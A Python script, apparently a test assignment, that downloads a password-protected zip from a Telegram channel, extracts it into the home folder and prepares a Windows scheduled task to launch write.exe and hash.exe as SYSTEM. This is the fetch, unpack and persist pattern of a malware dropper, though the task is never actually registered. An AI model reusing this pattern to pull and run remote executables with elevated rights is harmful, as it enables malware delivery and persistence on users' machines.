import asyncio
from pathlib import Path

import pyzipper
from telethon import TelegramClient

import win32com.client


api_id = int(input('Введите API ID: '))
api_hash = input('Введите API Hash: ')

client = TelegramClient('session', api_id, api_hash)
channel_name = 'test_task_4'

home_directory = Path.home()
required_file_name = 'test.zip'
downloaded_file = f'{home_directory}/{required_file_name}'


def extract_protected_zip(zip_path, extract_to):
    try:
        with pyzipper.AESZipFile(zip_path, 'r') as zip_ref:
            password = input('Введите пароль для архива (123): ')
            zip_ref.extractall(extract_to, pwd=password.encode('utf-8'))
            print(f'Успешно разархивировано')
    except Exception as e:
        print(f'Ошибка: {e}')


zip_file_path = downloaded_file
destination_folder = home_directory


async def main():
    async for message in client.iter_messages(channel_name, limit=10):
        if message.file and message.file.name == required_file_name:
            print(f'Скачивание {required_file_name}...')
            await message.download_media(downloaded_file)
            print('Файл успешно скачан, разархивирование...')
            extract_protected_zip(zip_file_path, destination_folder)
    # hash_from_telegram = (await client.get_messages(channel_name, limit=1))[0].message
    # print(hash_from_telegram)

with client:
    client.loop.run_until_complete(main())

scheduler = win32com.client.Dispatch('Schedule.Service')
scheduler.Connect()

try:
    task_def = scheduler.NewTask(0)
    action = task_def.Actions.Create(0)
    action.Path = 'cmd.exe'
    action.Arguments = f'/c "start "" "{home_directory}/write.exe" & start "" "{home_directory}/hash.exe""'
    task_def.RegistrationInfo.Description = 'TimeToWrite'
    task_def.Principal.UserId = 'SYSTEM'
    task_def.Principal.LogonType = 3
    task_def.Settings.StartWhenAvailable = True

    print(f'Задача на запуск write.exe, hash.exe была создана')
    input('Нажмите ENTER для выхода')
except Exception as e:
    print(f'Ошибка при создании задачи: {e}')
